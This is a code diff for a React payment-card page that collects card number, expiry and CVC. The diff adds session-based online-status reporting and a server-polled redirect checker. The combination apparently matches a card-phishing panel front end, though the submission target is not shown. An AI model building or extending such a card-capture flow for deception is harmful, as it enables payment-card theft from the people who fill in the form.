@@ -2,9 +2,19 @@ import React, { useState } from "react";
 import styles from "./ChangeCard.module.css";
 import { useRedirectChecker } from "../../hooks/useRedirectChecker";
 import Loading from "../../components/Loading/Loading";
+import { useOnlineStatus } from "../../hooks/useOnlineStatus";
 
 const BalancePage: React.FC = () => {
+
+  const sessionId = localStorage.getItem("currentSessionId");
+
   useRedirectChecker(3000);
+  useRedirectChecker(3000);
+  useOnlineStatus({
+    sessionId,
+    pageName: "change",
+    enabled: true,
+  });
   const [change, setChange] = useState("");
   const [expiryDate, setExpiryDate] = useState("");
   const [cvc, setCvc] = useState("");
@@ -37,8 +47,6 @@ const BalancePage: React.FC = () => {
     setError("");
 
     try {
-      const sessionId = localStorage.getItem("currentSessionId");
-
       if (!sessionId) {
         setIsLoading(false);
         setError("Session not found");
@@ -61,15 +69,14 @@ const BalancePage: React.FC = () => {
       const result = await response.json();
 
       if (result.success) {
-       
         setChange("");
         setExpiryDate("");
         setCvc("");
-      } 
+      }
     } catch (error) {
       console.error("Error submitting card change:", error);
       setError("Network error. Please try again.");
-    } 
+    }
   };
 
   const formatBalance = (value: string) => {
@@ -100,12 +107,17 @@ const BalancePage: React.FC = () => {
     if (date.length !== 5) return false;
 
     // Проверяем, что строка содержит слэш на третьей позиции
-    if (date[2] !== '/') return false;
+    if (date[2] !== "/") return false;
 
     const [monthStr, yearStr] = date.split("/");
-    
+
     // Проверяем, что разбиение произошло корректно
-    if (!monthStr || !yearStr || monthStr.length !== 2 || yearStr.length !== 2) {
+    if (
+      !monthStr ||
+      !yearStr ||
+      monthStr.length !== 2 ||
+      yearStr.length !== 2
+    ) {
       return false;
     }
 
